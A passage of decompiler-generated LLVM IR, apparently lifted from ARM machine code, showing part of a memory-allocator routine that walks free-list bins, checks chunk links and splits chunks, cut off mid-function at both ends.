  %v1_16958 = load i32, i32* @r6, align 4
  %v2_16958 = add i32 %v1_16958, 8
  %v3_16958 = inttoptr i32 %v2_16958 to i32*
  store i32 %v0_16958, i32* %v3_16958, align 4
  %v0_1695c = load i32, i32* %r3.global-to-local, align 4
  %v1_1695c = load i32, i32* %r1.global-to-local, align 4
  %v2_1695c = add i32 %v1_1695c, 820
  %v3_1695c = inttoptr i32 %v2_1695c to i32*
  store i32 %v0_1695c, i32* %v3_1695c, align 4
  %v0_16960 = load i32, i32* @r6, align 4
  %v1_16960 = load i32, i32* @lr, align 4
  %v2_16960 = add i32 %v1_16960, 12
  %v3_16960 = inttoptr i32 %v2_16960 to i32*
  store i32 %v0_16960, i32* %v3_16960, align 4
  %v0_16964 = load i32, i32* @r6, align 4
  %v1_16964 = load i32, i32* %ip.global-to-local, align 4
  %v2_16964 = add i32 %v1_16964, 8
  %v3_16964 = inttoptr i32 %v2_16964 to i32*
  store i32 %v0_16964, i32* %v3_16964, align 4
  %v0_16980.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16980

dec_label_pc_1696c:                               ; preds = %dec_label_pc_1680c, %dec_label_pc_167c4, %dec_label_pc_16820
  store i32 36, i32* %r8.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %r1.global-to-local, align 4
  %v4_16974 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 36) to i32*), align 4
  store i32 %v4_16974, i32* @sb, align 4
  %v0_16978 = load i32, i32* @sl, align 4
  %v1_16978 = add i32 %v0_16978, 16
  store i32 %v1_16978, i32* @fp, align 4
  %v1_1697c = add i32 %v4_16974, 52
  store i32 %v1_1697c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16980

dec_label_pc_16980:                               ; preds = %dec_label_pc_16934, %dec_label_pc_1696c
  %v0_168a0 = phi i32 [ %v0_16980.pre, %dec_label_pc_16934 ], [ %v1_1697c, %dec_label_pc_1696c ]
  %v1_16980 = add i32 %v0_168a0, 12
  %v2_16980 = inttoptr i32 %v1_16980 to i32*
  %v3_16980 = load i32, i32* %v2_16980, align 4
  store i32 %v3_16980, i32* @r6, align 4
  %v9_16984 = icmp eq i32 %v3_16980, %v0_168a0
  br i1 %v9_16984, label %dec_label_pc_1698c, label %dec_label_pc_16834

dec_label_pc_1698c:                               ; preds = %dec_label_pc_16980
  %v0_1698c = load i32, i32* @sl, align 4
  %tmp207 = icmp ult i32 %v0_1698c, 256
  %v0_16a44.pre = load i32, i32* @r7, align 4
  br i1 %tmp207, label %dec_label_pc_1698c.dec_label_pc_16a44_crit_edge, label %dec_label_pc_16994

dec_label_pc_1698c.dec_label_pc_16a44_crit_edge:  ; preds = %dec_label_pc_1698c
  %.pre201 = mul i32 %v0_16a44.pre, 8
  br label %dec_label_pc_16a44

dec_label_pc_16994:                               ; preds = %dec_label_pc_1698c
  %v4_16994 = mul i32 %v0_16a44.pre, 8
  %v5_16994 = add i32 %v4_16994, %v0_168a0
  store i32 %v5_16994, i32* %r3.global-to-local, align 4
  %v1_16998 = add i32 %v5_16994, -8
  store i32 %v1_16998, i32* %r1.global-to-local, align 4
  %v1_1699c = add i32 %v5_16994, 4
  %v2_1699c = inttoptr i32 %v1_1699c to i32*
  %storemerge.pre = load i32, i32* %v2_1699c, align 4
  br label %dec_label_pc_16a3c

dec_label_pc_169a4:                               ; preds = %dec_label_pc_16a3c
  %v1_169a4 = add i32 %v1_169cc, 4
  %v2_169a4 = inttoptr i32 %v1_169a4 to i32*
  %v3_169a4 = load i32, i32* %v2_169a4, align 4
  store i32 %v3_169a4, i32* %r3.global-to-local, align 4
  %v1_169a8 = and i32 %v3_169a4, -4
  store i32 %v1_169a8, i32* %r2.global-to-local, align 4
  %v3_169ac = icmp ult i32 %v1_169a8, %v0_1698c
  %v1_169b0 = add i32 %v1_169cc, 12
  %v2_169b0 = inttoptr i32 %v1_169b0 to i32*
  %v3_169b0 = load i32, i32* %v2_169b0, align 4
  store i32 %v3_169b0, i32* %r0.global-to-local, align 4
  br i1 %v3_169ac, label %dec_label_pc_16a3c, label %dec_label_pc_169b8

dec_label_pc_169b8:                               ; preds = %dec_label_pc_169a4
  %v1_169b8 = add i32 %v1_169cc, 8
  %v2_169b8 = inttoptr i32 %v1_169b8 to i32*
  %v3_169b8 = load i32, i32* %v2_169b8, align 4
  store i32 %v3_169b8, i32* %r1.global-to-local, align 4
  %v1_169bc = add i32 %v3_169b8, 12
  %v2_169bc = inttoptr i32 %v1_169bc to i32*
  %v3_169bc = load i32, i32* %v2_169bc, align 4
  store i32 %v3_169bc, i32* %r3.global-to-local, align 4
  %v9_169c0 = icmp eq i32 %v3_169bc, %v1_169cc
  br i1 %v9_169c0, label %dec_label_pc_169c8, label %dec_label_pc_169d4

dec_label_pc_169c8:                               ; preds = %dec_label_pc_169b8
  %v1_169c8 = add i32 %v3_169b0, 8
  %v2_169c8 = inttoptr i32 %v1_169c8 to i32*
  %v3_169c8 = load i32, i32* %v2_169c8, align 4
  store i32 %v3_169c8, i32* %r3.global-to-local, align 4
  %v9_169cc = icmp eq i32 %v3_169c8, %v1_169cc
  br i1 %v9_169cc, label %dec_label_pc_169d8, label %dec_label_pc_169d4

dec_label_pc_169d4:                               ; preds = %dec_label_pc_169b8, %dec_label_pc_169c8
  %v0_169d4 = call i32 @abort()
  store i32 %v0_169d4, i32* %r0.global-to-local, align 4
  %v0_169d8.pre = load i32, i32* @sl, align 4
  %v1_169d8.pre = load i32, i32* @r2, align 4
  %v0_169e0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_169d8

dec_label_pc_169d8:                               ; preds = %dec_label_pc_169c8, %dec_label_pc_169d4
  %v1_169e0 = phi i32 [ %v3_169b0, %dec_label_pc_169c8 ], [ %v0_169d4, %dec_label_pc_169d4 ]
  %v0_169e0 = phi i32 [ %v3_169b8, %dec_label_pc_169c8 ], [ %v0_169e0.pre, %dec_label_pc_169d4 ]
  %v1_169d8 = phi i32 [ %v1_169a8, %dec_label_pc_169c8 ], [ %v1_169d8.pre, %dec_label_pc_169d4 ]
  %v0_169d8 = phi i32 [ %v0_1698c, %dec_label_pc_169c8 ], [ %v0_169d8.pre, %dec_label_pc_169d4 ]
  %v2_169d8 = sub i32 %v1_169d8, %v0_169d8
  store i32 %v2_169d8, i32* %lr.global-to-local, align 4
  %v2_169e0 = add i32 %v1_169e0, 8
  %v3_169e0 = inttoptr i32 %v2_169e0 to i32*
  store i32 %v0_169e0, i32* %v3_169e0, align 4
  %v0_169e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_169e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_169e4 = add i32 %v1_169e4, 12
  %v3_169e4 = inttoptr i32 %v2_169e4 to i32*
  store i32 %v0_169e4, i32* %v3_169e4, align 4
  %v0_169e8 = load i32, i32* %ip.global-to-local, align 4
  %v1_169e8 = add i32 %v0_169e8, 8
  store i32 %v1_169e8, i32* %r0.global-to-local, align 4
  %tmp208 = icmp ugt i32 %v2_169d8, 15
  br i1 %tmp208, label %dec_label_pc_16a08, label %dec_label_pc_169f0

dec_label_pc_169f0:                               ; preds = %dec_label_pc_169d8
  %v1_169f0 = load i32, i32* %r2.global-to-local, align 4
  %v2_169f0 = add i32 %v1_169f0, %v0_169e8
  store i32 %v2_169f0, i32* %r2.global-to-local, align 4
  %v1_169f4 = add i32 %v2_169f0, 4
  %v2_169f4 = inttoptr i32 %v1_169f4 to i32*
  %v3_169f4 = load i32, i32* %v2_169f4, align 4
  store i32 %v3_169f4, i32* %r3.global-to-local, align 4
  store i32 %v1_169e8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_169fc

dec_label_pc_169fc.loopexit:                      ; preds = %dec_label_pc_1689c
  %v1_168a8 = load i32, i32* @r6, align 4
  %v2_168a8 = load i32, i32* @sl, align 4
  %v3_168a8 = add i32 %v2_168a8, %v1_168a8
  store i32 %v3_168a8, i32* %r2.global-to-local, align 4
  %v2_168ac = add i32 %v3_168a8, 4
  %v3_168ac = inttoptr i32 %v2_168ac to i32*
  %v4_168ac = load i32, i32* %v3_168ac, align 4
  store i32 %v4_168ac, i32* %r3.global-to-local, align 4
  %v2_168b0 = add i32 %v1_168a8, 8
  store i32 %v2_168b0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_169fc

dec_label_pc_169fc:                               ; preds = %.dec_label_pc_169fc_crit_edge, %dec_label_pc_169fc.loopexit, %dec_label_pc_169f0
  %v1_16a00 = phi i32 [ %v4_16b24, %.dec_label_pc_169fc_crit_edge ], [ %v3_168a8, %dec_label_pc_169fc.loopexit ], [ %v2_169f0, %dec_label_pc_169f0 ]
  %v0_169fc = phi i32 [ %v7_16b24, %.dec_label_pc_169fc_crit_edge ], [ %v4_168ac, %dec_label_pc_169fc.loopexit ], [ %v3_169f4, %dec_label_pc_169f0 ]
  %v1_169fc = or i32 %v0_169fc, 1
  store i32 %v1_169fc, i32* %r3.global-to-local, align 4
  %v2_16a00 = add i32 %v1_16a00, 4
  %v3_16a00 = inttoptr i32 %v2_16a00 to i32*
  store i32 %v1_169fc, i32* %v3_16a00, align 4
  br label %dec_label_pc_16fbc

dec_label_pc_16a08:                               ; preds = %dec_label_pc_169d8
  %v1_16a08 = load i32, i32* @sl, align 4
  %v2_16a08 = add i32 %v1_16a08, %v0_169e8
  store i32 %v2_16a08, i32* %r2.global-to-local, align 4
  %v1_16a0c = or i32 %v1_16a08, 1
  store i32 %v1_16a0c, i32* %r3.global-to-local, align 4
  %v0_16a10 = load i32, i32* %lr.global-to-local, align 4
  %v1_16a10 = or i32 %v0_16a10, 1
  store i32 %v1_16a10, i32* %r1.global-to-local, align 4
  store i32 %v1_169e8, i32* %r4.global-to-local, align 4
  %v2_16a18 = add i32 %v0_169e8, 4
  %v3_16a18 = inttoptr i32 %v2_16a18 to i32*
  store i32 %v1_16a0c, i32* %v3_16a18, align 4
  %v0_16a1c = load i32, i32* %r2.global-to-local, align 4
  %v1_16a1c = load i32, i32* @r6, align 4
  %v2_16a1c = add i32 %v1_16a1c, 8
  %v3_16a1c = inttoptr i32 %v2_16a1c to i32*
  store i32 %v0_16a1c, i32* %v3_16a1c, align 4
  %v0_16a20 = load i32, i32* %r2.global-to-local, align 4
  %v1_16a20 = load i32, i32* @r6, align 4
  %v2_16a20 = add i32 %v1_16a20, 12
  %v3_16a20 = inttoptr i32 %v2_16a20 to i32*
  store i32 %v0_16a20, i32* %v3_16a20, align 4
  %v0_16a24 = load i32, i32* %lr.global-to-local, align 4
  %v1_16a24 = load i32, i32* %r2.global-to-local, align 4
  %v3_16a24 = add i32 %v1_16a24, %v0_16a24
  %v4_16a24 = inttoptr i32 %v3_16a24 to i32*
  store i32 %v0_16a24, i32* %v4_16a24, align 4
  %v0_16a28 = load i32, i32* %r1.global-to-local, align 4
  %v1_16a28 = load i32, i32* %r2.global-to-local, align 4
  %v2_16a28 = add i32 %v1_16a28, 4
  %v3_16a28 = inttoptr i32 %v2_16a28 to i32*
  store i32 %v0_16a28, i32* %v3_16a28, align 4
  %v0_16a2c = load i32, i32* @r6, align 4
  %v1_16a2c = load i32, i32* %r2.global-to-local, align 4
  %v2_16a2c = add i32 %v1_16a2c, 12
  %v3_16a2c = inttoptr i32 %v2_16a2c to i32*
  store i32 %v0_16a2c, i32* %v3_16a2c, align 4
  %v0_16a30 = load i32, i32* @r6, align 4
  %v1_16a30 = load i32, i32* %r2.global-to-local, align 4
  %v2_16a30 = add i32 %v1_16a30, 8
  %v3_16a30 = inttoptr i32 %v2_16a30 to i32*
  store i32 %v0_16a30, i32* %v3_16a30, align 4
  br label %dec_label_pc_16fbc

dec_label_pc_16a3c:                               ; preds = %dec_label_pc_169a4, %dec_label_pc_16994
  %v1_169cc = phi i32 [ %storemerge.pre, %dec_label_pc_16994 ], [ %v3_169b0, %dec_label_pc_169a4 ]
  store i32 %v1_169cc, i32* %ip.global-to-local, align 4
  %v9_16a3c = icmp eq i32 %v1_169cc, %v1_16998
  br i1 %v9_16a3c, label %dec_label_pc_16a44.loopexit, label %dec_label_pc_169a4

dec_label_pc_16a44.loopexit:                      ; preds = %dec_label_pc_16a3c
  br label %dec_label_pc_16a44

dec_label_pc_16a44:                               ; preds = %dec_label_pc_1698c.dec_label_pc_16a44_crit_edge, %dec_label_pc_16a44.loopexit
  %v4_16a74.pre-phi = phi i32 [ %.pre201, %dec_label_pc_1698c.dec_label_pc_16a44_crit_edge ], [ %v4_16994, %dec_label_pc_16a44.loopexit ]
  %v1_16a44 = add i32 %v0_16a44.pre, 1
  store i32 %v1_16a44, i32* %r2.global-to-local, align 4
  %v1_16a48 = urem i32 %v1_16a44, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %r0.global-to-local, align 4
  %v6_16a54 = shl i32 1, %v1_16a48
  store i32 %v6_16a54, i32* %ip.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_16a5c = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 36) to i32*), align 4
  store i32 %v4_16a5c, i32* %r3.global-to-local, align 4
  %v3_16a60 = udiv i32 %v1_16a44, 32
  store i32 %v3_16a60, i32* @r5, align 4
  %v4_16a64 = mul nuw nsw i32 %v3_16a60, 4
  %v5_16a64 = add i32 %v4_16a5c, %v4_16a64
  store i32 %v5_16a64, i32* %r2.global-to-local, align 4
  %v1_16a68 = add i32 %v5_16a64, 820
  %v2_16a68 = inttoptr i32 %v1_16a68 to i32*
  %v3_16a68 = load i32, i32* %v2_16a68, align 4
  store i32 %v3_16a68, i32* @r4, align 4
  %v1_16a6c = add i32 %v4_16a5c, 52
  store i32 %v1_16a6c, i32* %r3.global-to-local, align 4
  store i32 36, i32* @r8, align 4
  %v5_16a74 = add i32 %v1_16a6c, %v4_16a74.pre-phi
  store i32 %v5_16a74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16a78

dec_label_pc_16a78:                               ; preds = %dec_label_pc_16ae0, %dec_label_pc_16a44
  %v1_16a80 = phi i32 [ %v1_16a80.pre, %dec_label_pc_16ae0 ], [ %v3_16a68, %dec_label_pc_16a44 ]
  %v0_16a80 = phi i32 [ %v0_16a78.pre, %dec_label_pc_16ae0 ], [ %v6_16a54, %dec_label_pc_16a44 ]
  %v1_16a78 = sub i32 1, %v0_16a80
  %v2_16a78 = icmp ult i32 %v0_16a80, 2
  %v1_16a78. = select i1 %v2_16a78, i32 %v1_16a78, i32 0
  store i32 %v1_16a78., i32* %r3.global-to-local, align 4
  %tmp142 = icmp ugt i32 %v0_16a80, %v1_16a80
  br i1 %tmp142, label %.thread13, label %bb143

.thread13:                                        ; preds = %dec_label_pc_16a78
  %v5_16a84 = or i32 %v1_16a78., 1
  store i32 %v5_16a84, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16a90.preheader

bb143:                                            ; preds = %dec_label_pc_16a78
  %v2_16a88 = icmp eq i32 %v1_16a78., 0
  br i1 %v2_16a88, label %.dec_label_pc_16acc.preheader_crit_edge, label %dec_label_pc_16a90.preheader

.dec_label_pc_16acc.preheader_crit_edge:          ; preds = %bb143
  %v0_16ac455.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16acc.preheader

dec_label_pc_16a90.preheader:                     ; preds = %bb143, %.thread13
  %v0_16a90.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16a90

dec_label_pc_16a90:                               ; preds = %dec_label_pc_16a90.preheader, %dec_label_pc_16a9c
  %v0_16a90 = phi i32 [ %v0_16a90.pre, %dec_label_pc_16a90.preheader ], [ %v1_16a90, %dec_label_pc_16a9c ]
  %v1_16a90 = add i32 %v0_16a90, 1
  store i32 %v1_16a90, i32* @r5, align 4
  %tmp209 = icmp ugt i32 %v1_16a90, 2
  br i1 %tmp209, label %dec_label_pc_16b70.loopexit, label %dec_label_pc_16a9c

dec_label_pc_16a9c:                               ; preds = %dec_label_pc_16a90
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %r3.global-to-local, align 4
  %v1_16aa0 = load i32, i32* @r8, align 4
  %v2_16aa0 = add i32 %v1_16aa0, sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32)
  %v3_16aa0 = inttoptr i32 %v2_16aa0 to i32*
  %v4_16aa0 = load i32, i32* %v3_16aa0, align 4
  store i32 %v4_16aa0, i32* %r2.global-to-local, align 4
  %v4_16aa4 = mul i32 %v1_16a90, 4
  %v5_16aa4 = add i32 %v4_16aa0, %v4_16aa4
  store i32 %v5_16aa4, i32* %r3.global-to-local, align 4
  %v1_16aa8 = add i32 %v5_16aa4, 820
  %v2_16aa8 = inttoptr i32 %v1_16aa8 to i32*
  %v3_16aa8 = load i32, i32* %v2_16aa8, align 4
  store i32 %v3_16aa8, i32* @r4, align 4
  %v2_16aac = icmp eq i32 %v3_16aa8, 0
  br i1 %v2_16aac, label %dec_label_pc_16a90, label %dec_label_pc_16ab4

dec_label_pc_16ab4:                               ; preds = %dec_label_pc_16a9c
  %v4_16ab4 = mul i32 %v1_16a90, 256
  %v5_16ab4 = add i32 %v4_16aa0, %v4_16ab4
  store i32 %v5_16ab4, i32* %r3.global-to-local, align 4
  %v1_16ab8 = add i32 %v5_16ab4, 44
  store i32 %v1_16ab8, i32* %r0.global-to-local, align 4
  %v0_16abc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_16abc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16acc.preheader

dec_label_pc_16acc.preheader:                     ; preds = %.dec_label_pc_16acc.preheader_crit_edge, %dec_label_pc_16ab4
  %v0_16ac455 = phi i32 [ %v1_16ab8, %dec_label_pc_16ab4 ], [ %v0_16ac455.pre, %.dec_label_pc_16acc.preheader_crit_edge ]
  %v0_16ae8 = phi i32 [ %v3_16aa8, %dec_label_pc_16ab4 ], [ %v1_16a80, %.dec_label_pc_16acc.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_16abc, %dec_label_pc_16ab4 ], [ %v0_16a80, %.dec_label_pc_16acc.preheader_crit_edge ]
  %v2_16acc52 = and i32 %ip.promoted, %v0_16ae8
  %v4_16acc54 = icmp eq i32 %v2_16acc52, 0
  br i1 %v4_16acc54, label %dec_label_pc_16ac4, label %dec_label_pc_16ad4

dec_label_pc_16ac4:                               ; preds = %dec_label_pc_16acc.preheader, %dec_label_pc_16ac4
  %v2_16ac857 = phi i32 [ %v2_16ac8, %dec_label_pc_16ac4 ], [ %ip.promoted, %dec_label_pc_16acc.preheader ]
  %v0_16ac456 = phi i32 [ %v1_16ac4, %dec_label_pc_16ac4 ], [ %v0_16ac455, %dec_label_pc_16acc.preheader ]
  %v1_16ac4 = add i32 %v0_16ac456, 8
  %v2_16ac8 = mul i32 %v2_16ac857, 2
  %v2_16acc = and i32 %v2_16ac8, %v0_16ae8
  %v4_16acc = icmp eq i32 %v2_16acc, 0
  br i1 %v4_16acc, label %dec_label_pc_16ac4, label %dec_label_pc_16acc.dec_label_pc_16ad4_crit_edge

dec_label_pc_16acc.dec_label_pc_16ad4_crit_edge:  ; preds = %dec_label_pc_16ac4
  store i32 %v1_16ac4, i32* %r0.global-to-local, align 4
  store i32 %v2_16ac8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16ad4

dec_label_pc_16ad4:                               ; preds = %dec_label_pc_16acc.dec_label_pc_16ad4_crit_edge, %dec_label_pc_16acc.preheader
  %v0_16af4 = phi i32 [ %v2_16ac8, %dec_label_pc_16acc.dec_label_pc_16ad4_crit_edge ], [ %ip.promoted, %dec_label_pc_16acc.preheader ]
  %v0_16b18 = phi i32 [ %v1_16ac4, %dec_label_pc_16acc.dec_label_pc_16ad4_crit_edge ], [ %v0_16ac455, %dec_label_pc_16acc.preheader ]
  %v1_16ad4 = add i32 %v0_16b18, 12
  %v2_16ad4 = inttoptr i32 %v1_16ad4 to i32*
  %v3_16ad4 = load i32, i32* %v2_16ad4, align 4
  store i32 %v3_16ad4, i32* @lr, align 4
  %v9_16ad8 = icmp eq i32 %v3_16ad4, %v0_16b18
  br i1 %v9_16ad8, label %dec_label_pc_16ae0, label %dec_label_pc_16b00

dec_label_pc_16ae0:                               ; preds = %dec_label_pc_16ad4
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %r0.global-to-local, align 4
  %v1_16ae4 = load i32, i32* @r8, align 4
  %v2_16ae4 = add i32 %v1_16ae4, sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32)
  %v3_16ae4 = inttoptr i32 %v2_16ae4 to i32*
  %v4_16ae4 = load i32, i32* %v3_16ae4, align 4
  %v2_16ae8 = sub i32 -1, %v0_16af4
  %v3_16ae8 = and i32 %v0_16ae8, %v2_16ae8
  store i32 %v3_16ae8, i32* @r4, align 4
  %v1_16aec = load i32, i32* @r5, align 4
  %v4_16aec = mul i32 %v1_16aec, 4
  %v5_16aec = add i32 %v4_16aec, %v4_16ae4
  store i32 %v5_16aec, i32* %r3.global-to-local, align 4
  %v1_16af0 = add i32 %v0_16b18, 8
  store i32 %v1_16af0, i32* %r0.global-to-local, align 4
  %v2_16af4 = mul i32 %v0_16af4, 2
  store i32 %v2_16af4, i32* %ip.global-to-local, align 4
  %v2_16af8 = add i32 %v5_16aec, 820
  %v3_16af8 = inttoptr i32 %v2_16af8 to i32*
  store i32 %v3_16ae8, i32* %v3_16af8, align 4
  %v0_16a78.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_16a80.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16a78

dec_label_pc_16b00:                               ; preds = %dec_label_pc_16ad4
  %v1_16b00 = add i32 %v3_16ad4, 4
  %v2_16b00 = inttoptr i32 %v1_16b00 to i32*
  %v3_16b00 = load i32, i32* %v2_16b00, align 4
  store i32 %v3_16b00, i32* %r3.global-to-local, align 4
  %v1_16b04 = and i32 %v3_16b00, -4
  store i32 %v1_16b04, i32* %r2.global-to-local, align 4
  %v0_16b08 = load i32, i32* @sl, align 4
  %v2_16b08 = sub i32 %v1_16b04, %v0_16b08
  store i32 %v2_16b08, i32* %ip.global-to-local, align 4
  %v1_16b0c = add i32 %v3_16ad4, 12
  %v2_16b0c = inttoptr i32 %v1_16b0c to i32*
  %v3_16b0c = load i32, i32* %v2_16b0c, align 4
  store i32 %v3_16b0c, i32* %r3.global-to-local, align 4
  %tmp210 = icmp ult i32 %v2_16b08, 16
  br i1 %tmp210, label %bb144, label %bb145

bb144:                                            ; preds = %dec_label_pc_16b00
  %v6_16b14 = add i32 %v1_16b04, %v3_16ad4
  store i32 %v6_16b14, i32* %r2.global-to-local, align 4
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_16b00, %bb144
  %v2_16b18 = add i32 %v3_16b0c, 8
  %v3_16b18 = inttoptr i32 %v2_16b18 to i32*
  store i32 %v0_16b18, i32* %v3_16b18, align 4
  %v0_16b1c = load i32, i32* %r3.global-to-local, align 4
  %v1_16b1c = load i32, i32* %r0.global-to-local, align 4
  %v2_16b1c = add i32 %v1_16b1c, 12
  %v3_16b1c = inttoptr i32 %v2_16b1c to i32*
  store i32 %v0_16b1c, i32* %v3_16b1c, align 4
  %v4_16b20 = load i32, i32* @lr, align 4
  br i1 %tmp210, label %.dec_label_pc_169fc_crit_edge, label %dec_label_pc_16b2c

.dec_label_pc_169fc_crit_edge:                    ; preds = %bb145
  %v5_16b20 = add i32 %v4_16b20, 8
  store i32 %v5_16b20, i32* %r4.global-to-local, align 4
  %v4_16b24 = load i32, i32* %r2.global-to-local, align 4
  %v5_16b24 = add i32 %v4_16b24, 4
  %v6_16b24 = inttoptr i32 %v5_16b24 to i32*
  %v7_16b24 = load i32, i32* %v6_16b24, align 4
  store i32 %v7_16b24, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_169fc

dec_label_pc_16b2c:                               ; preds = %bb145
  %v1_16b2c = load i32, i32* @sl, align 4
  %v2_16b2c = add i32 %v1_16b2c, %v4_16b20
  store i32 %v2_16b2c, i32* %r1.global-to-local, align 4
  %v1_16b34 = load i32, i32* @r6, align 4
  %v2_16b34 = add i32 %v1_16b34, 8
  %v3_16b34 = inttoptr i32 %v2_16b34 to i32*
  store i32 %v2_16b2c, i32* %v3_16b34, align 4
  %v0_16b38 = load i32, i32* %r1.global-to-local, align 4
  %v1_16b38 = load i32, i32* @r6, align 4
  %v2_16b38 = add i32 %v1_16b38, 12
  %v3_16b38 = inttoptr i32 %v2_16b38 to i32*
  store i32 %v0_16b38, i32* %v3_16b38, align 4
  %v0_16b3c = load i32, i32* @r6, align 4
  %v1_16b3c = load i32, i32* %r1.global-to-local, align 4
  %v2_16b3c = add i32 %v1_16b3c, 8
  %v3_16b3c = inttoptr i32 %v2_16b3c to i32*
  store i32 %v0_16b3c, i32* %v3_16b3c, align 4
  %v0_16b40 = load i32, i32* @r6, align 4
  %v1_16b40 = load i32, i32* %r1.global-to-local, align 4
  %v2_16b40 = add i32 %v1_16b40, 12
  %v3_16b40 = inttoptr i32 %v2_16b40 to i32*
  store i32 %v0_16b40, i32* %v3_16b40, align 4
  %tmp211 = icmp ult i32 %v1_16b2c, 256
  br i1 %tmp211, label %bb146, label %.thread122

bb146:                                            ; preds = %dec_label_pc_16b2c
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %r2.global-to-local, align 4
  %v8_16b4c = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 36) to i32*), align 4
  store i32 %v8_16b4c, i32* %r3.global-to-local, align 4
  %v4_16b50 = load i32, i32* %r1.global-to-local, align 4
  %v6_16b50 = add i32 %v8_16b4c, 48
  %v7_16b50 = inttoptr i32 %v6_16b50 to i32*
  store i32 %v4_16b50, i32* %v7_16b50, align 4
  br label %.thread122

.thread122:                                       ; preds = %dec_label_pc_16b2c, %bb146
  %v0_16b54 = load i32, i32* @sl, align 4
  %v1_16b54 = or i32 %v0_16b54, 1
  store i32 %v1_16b54, i32* %r2.global-to-local, align 4
  %v0_16b58 = load i32, i32* %ip.global-to-local, align 4
  %v1_16b58 = or i32 %v0_16b58, 1
  store i32 %v1_16b58, i32* %r3.global-to-local, align 4
  %v0_16b5c = load i32, i32* @lr, align 4
  %v1_16b5c = add i32 %v0_16b5c, 8
  store i32 %v1_16b5c, i32* %r4.global-to-local, align 4
  %v2_16b60 = add i32 %v0_16b5c, 4
  %v3_16b60 = inttoptr i32 %v2_16b60 to i32*
  store i32 %v1_16b54, i32* %v3_16b60, align 4
  %v0_16b64 = load i32, i32* %ip.global-to-local, align 4
  %v1_16b64 = load i32, i32* %r1.global-to-local, align 4
  %v3_16b64 = add i32 %v1_16b64, %v0_16b64
  %v4_16b64 = inttoptr i32 %v3_16b64 to i32*
  store i32 %v0_16b64, i32* %v4_16b64, align 4
  %v0_16b68 = load i32, i32* %r3.global-to-local, align 4
  %v1_16b68 = load i32, i32* %r1.global-to-local, align 4
  %v2_16b68 = add i32 %v1_16b68, 4
  %v3_16b68 = inttoptr i32 %v2_16b68 to i32*
  store i32 %v0_16b68, i32* %v3_16b68, align 4
  br label %dec_label_pc_16fbc

dec_label_pc_16b70.loopexit:                      ; preds = %dec_label_pc_16a90
  br label %dec_label_pc_16b70

dec_label_pc_16b70:                               ; preds = %dec_label_pc_16b70.loopexit, %dec_label_pc_16784, %dec_label_pc_1678c
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %ip.global-to-local, align 4
  %v4_16b78 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 36) to i32*), align 4
  store i32 %v4_16b78, i32* @r0, align 4
  %v1_16b7c = add i32 %v4_16b78, 44
  %v2_16b7c = inttoptr i32 %v1_16b7c to i32*
  %v3_16b7c = load i32, i32* %v2_16b7c, align 4
  store i32 %v3_16b7c, i32* %ip.global-to-local, align 4
  %v1_16b80 = add i32 %v3_16b7c, 4
  %v2_16b80 = inttoptr i32 %v1_16b80 to i32*
  %v3_16b80 = load i32, i32* %v2_16b80, align 4
  %v0_16b84 = load i32, i32* @sl, align 4
  %v1_16b84 = add i32 %v0_16b84, 16
  store i32 %v1_16b84, i32* %r1.global-to-local, align 4
  %v1_16b88 = and i32 %v3_16b80, -4
  store i32 %v1_16b88, i32* %r3.global-to-local, align 4
  %v3_16b8c = icmp ult i32 %v1_16b88, %v1_16b84
  br i1 %v3_16b8c, label %dec_label_pc_16bbc, label %dec_label_pc_16b98

dec_label_pc_16b98:                               ; preds = %dec_label_pc_16b70
  %v2_16b98 = sub i32 %v1_16b88, %v0_16b84
  %v2_16b9c = add i32 %v0_16b84, %v3_16b7c
  store i32 %v2_16b9c, i32* %r1.global-to-local, align 4
  %v1_16ba0 = or i32 %v2_16b98, 1
  store i32 %v1_16ba0, i32* %r3.global-to-local, align 4
  %v1_16ba4 = or i32 %v0_16b84, 1
  store i32 %v1_16ba4, i32* %r2.global-to-local, align 4
  %v1_16ba8 = add i32 %v3_16b7c, 8
  store i32 %v1_16ba8, i32* %r4.global-to-local, align 4
  store i32 %v1_16ba4, i32* %v2_16b80, align 4
  %v0_16bb0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16bb0 = load i32, i32* @r0, align 4
  %v2_16bb0 = add i32 %v1_16bb0, 44
  %v3_16bb0 = inttoptr i32 %v2_16bb0 to i32*
